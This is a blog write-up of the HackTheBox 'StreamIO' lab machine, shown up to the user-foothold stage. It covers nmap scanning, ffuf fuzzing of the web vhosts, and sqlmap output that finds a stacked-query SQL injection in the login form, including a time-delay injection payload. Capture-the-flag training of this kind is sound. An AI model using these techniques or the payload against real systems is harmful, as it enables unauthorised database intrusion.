<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.5.45">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="0xPThree">
<meta name="dcterms.date" content="2022-08-03">
<meta name="description" content="StreamIO is an medium-rated Windows machine from HackTheBox. For me this box was quite slow to start where I had to put a lot of time and energy into fuzzing and manually exploiting SQLi, but once I gained a foothold it was really fun and straight forward. In the end I’ve gained a deeper understanding of Active Directory and it’s ACLs, as well as never to trust sqlmap doing even the easiest of tasks. Yet again BloodyAD proves it’s worth as an amazing Active Directory Privilege Escalation tool.">

<title>StreamIO - Hack The Box</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../../">
<link href="../../favicon.ico" rel="icon">
<script src="../../site_libs/quarto-html/quarto.js"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>

<script type="text/javascript">

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
</script>

  <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml-full.js" type="text/javascript"></script>

<script type="text/javascript">
const typesetMath = (el) => {
  if (window.MathJax) {
    // MathJax Typeset
    window.MathJax.typeset([el]);
  } else if (window.katex) {
    // KaTeX Render
    var mathElements = el.getElementsByClassName("math");
    var macros = [];
    for (var i = 0; i < mathElements.length; i++) {
      var texText = mathElements[i].firstChild;
      if (mathElements[i].tagName == "SPAN") {
        window.katex.render(texText.data, mathElements[i], {
          displayMode: mathElements[i].classList.contains('display'),
          throwOnError: false,
          macros: macros,
          fleqn: false
        });
      }
    }
  }
}
window.Quarto = {
  typesetMath
};
</script>

<link rel="stylesheet" href="../../scss/styles.css">
<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
</head>

<body class="nav-fixed">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top quarto-banner">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../index.html"> 
<span class="menu-text">Home</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
<span class="menu-text">Notes</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../about.html"> 
<span class="menu-text">About</span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
            <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">StreamIO - Hack The Box</h1>
                  <div>
        <div class="description">
          StreamIO is an medium-rated Windows machine from HackTheBox. For me this box was quite slow to start where I had to put a lot of time and energy into fuzzing and manually exploiting SQLi, but once I gained a foothold it was really fun and straight forward. In the end I’ve gained a deeper understanding of Active Directory and it’s ACLs, as well as never to trust sqlmap doing even the easiest of tasks. Yet again BloodyAD proves it’s worth as an amazing Active Directory Privilege Escalation tool.
        </div>
      </div>
                          <div class="quarto-categories">
                <div class="quarto-category">hackthebox</div>
                <div class="quarto-category">windows</div>
                <div class="quarto-category">fuzzing</div>
                <div class="quarto-category">sqli</div>
                <div class="quarto-category">php</div>
                <div class="quarto-category">bloodhound</div>
                <div class="quarto-category">bloodyad</div>
                <div class="quarto-category">firefox</div>
              </div>
                  </div>
  </div>
    
  
  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>0xPThree </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">August 3, 2022</p>
      </div>
    </div>
    
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">On this page</h2>
   
  <ul>
  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
  <ul class="collapse">
  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
  </ul></li>
  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
  <ul class="collapse">
  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
  </ul></li>
  <li><a href="#referenses" id="toc-referenses" class="nav-link" data-scroll-target="#referenses">Referenses</a></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p-</span> <span class="at">-v</span> 10.10.11.158</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">53/tcp</span>    open  domain</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>    open  http</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">135/tcp</span>   open  msrpc</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">389/tcp</span>   open  ldap</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">443/tcp</span>   open  https</span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="ex">636/tcp</span>   open  ldapssl</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="ex">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">5985/tcp</span>  open  wsman</span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">9389/tcp</span>  open  adws</span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="ex">49667/tcp</span> open  unknown</span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="ex">49673/tcp</span> open  unknown</span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="ex">49674/tcp</span> open  unknown</span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="ex">49701/tcp</span> open  unknown</span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="ex">50436/tcp</span> open  unknown</span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49701,50436</span> <span class="at">-sCV</span> 10.10.11.158   </span>
<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a><span class="ex">53/tcp</span>    open  domain        Simple DNS Plus</span>
<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>    open  http          Microsoft IIS httpd 10.0</span>
<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">http-methods:</span> </span>
<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> IIS Windows Server</span>
<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a><span class="ex">88/tcp</span>    open  kerberos-sec  Microsoft Windows Kerberos <span class="er">(</span><span class="ex">server</span> time: 2022-06-28 15:05:15Z<span class="kw">)</span></span>
<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a><span class="ex">135/tcp</span>   open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a><span class="ex">139/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a><span class="ex">389/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> streamIO.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a><span class="ex">443/tcp</span>   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="er">(</span><span class="ex">SSDP/UPnP</span><span class="kw">)</span></span>
<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: commonName=streamIO/countryName=EU</span>
<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Subject</span> Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span>
<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2022-02-22T07:03:28</span>
<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2022-03-24T07:03:28</span>
<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-06-28T15:06:45+00:00<span class="kw">;</span> <span class="ex">+7h00m00s</span> from scanner time.</span>
<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">tls-alpn:</span> </span>
<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  http/1.1</span>
<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Not Found</span>
<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a><span class="ex">445/tcp</span>   open  microsoft-ds<span class="pp">?</span></span>
<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a><span class="ex">464/tcp</span>   open  kpasswd5<span class="pp">?</span></span>
<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a><span class="ex">593/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a><span class="ex">636/tcp</span>   open  tcpwrapped</span>
<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a><span class="ex">3268/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> streamIO.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a><span class="ex">3269/tcp</span>  open  tcpwrapped</span>
<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a><span class="ex">5985/tcp</span>  open  http          Microsoft HTTPAPI httpd 2.0 <span class="er">(</span><span class="ex">SSDP/UPnP</span><span class="kw">)</span></span>
<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Not Found</span>
<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a><span class="ex">9389/tcp</span>  open  mc-nmf        .NET Message Framing</span>
<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a><span class="ex">49667/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a><span class="ex">49673/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a><span class="ex">49674/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a><span class="ex">49701/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a><span class="ex">50436/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: Host: DC<span class="kw">;</span> <span class="ex">OS:</span> Windows<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:microsoft:windows</span>
<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio sudo nmap <span class="at">-sU</span> <span class="at">-v</span> 10.10.11.158 <span class="at">-Pn</span> <span class="at">--top-port</span><span class="op">=</span>100</span>
<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>    STATE SERVICE</span>
<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a><span class="ex">53/udp</span>  open  domain</span>
<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a><span class="ex">123/udp</span> open  ntp</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<ul>
<li>Domain: streamIO.htb</li>
<li>Vhost: watch.streamIO.htb</li>
</ul>
<p>Going through the website, https://streamio.htb, we find an email address in the footer - <strong>oliver@streamio.htb</strong>. In the “about us” section we find two more users, <strong>Barry</strong> and <strong>Samantha</strong>.</p>
<p><strong>FFUF</strong>:</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> https://streamio.htb/FUZZ </span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ADMIN</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 31ms]</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Admin</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 29ms]</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Images</span>                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 29ms]</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">admin</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 28ms]</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">css</span>                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 29ms]</span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">favicon.ico</span>             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 29ms]</span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="ex">fonts</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 33ms]</span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="ex">images</span>                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 28ms]</span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="ex">js</span>                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 30ms]</span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> https://streamio.htb/admin/FUZZ.php</span>
<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Index</span>                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 33ms]</span>
<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="ex">index</span>                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 32ms]</span>
<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="ex">master</span>                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 40ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio curl <span class="at">-k</span> https://streamio.htb/admin/master.php</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h1<span class="op">&gt;</span>Movie <span class="ex">managment</span><span class="op">&lt;</span>/h1<span class="op">&gt;</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Only</span> accessable through includes%</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Maybe we’ll find a include parameter which we controll, and can call <code>https://streamio.htb/admin/master.php</code> ?</p>
<p>We can’t bypass the 403 to access any admin-page. The signup function of the site doesn’t seem to do anything, we can “create” an account but can’t login with it. The signup nor the login is vulnerable to sqli. Move on to the vhost, <code>watch.streamio.htb</code>.</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> https://watch.streamio.htb/FUZZ.php               </span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Index</span>                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 33ms]</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Search</span>                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 88ms]</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">blocked</span>                 [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 32ms]</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="ex">index</span>                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 36ms]</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="ex">search</span>                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 50ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>At <code>https://watch.streamio.htb/search.php</code> we find all of the movies, however we are met with an error when trying to watch any of them.</p>
<p>We have a lot of different input fields and it would be wise to test SQLi on ..<br> .. login at <code>streamio.htb/login.php</code><br> .. email subscription at <code>watch.streamio.htb</code><br> .. search at <code>watch.streamio.htb/search.php</code><br></p>
<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">## LOGIN</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio sqlmap <span class="at">-r</span> req-login.txt <span class="at">--dbs</span> <span class="at">--threads</span> 5 <span class="at">--force-ssl</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[11:52:15]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> <span class="er">(</span><span class="ex">custom</span><span class="kw">)</span> <span class="ex">POST</span> parameter <span class="st">'#1*'</span> appears to be <span class="st">'Microsoft SQL Server/Sybase stacked queries (comment)'</span> injectable </span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> identified the following injection point<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">with</span> a total of 66 HTTP<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">requests:</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Parameter:</span> <span class="co">#1* ((custom) POST)</span></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Type:</span> stacked queries</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Title:</span> Microsoft SQL Server/Sybase stacked queries <span class="er">(</span><span class="ex">comment</span><span class="kw">)</span></span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Payload:</span> username=<span class="st">';WAITFOR DELAY '</span>0:0:5<span class="st">'--&amp;password=asdf'</span></span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="ex">available</span> databases <span class="pp">[</span><span class="ss">5</span><span class="pp">]</span>:</span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> model</span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> msdb</span>
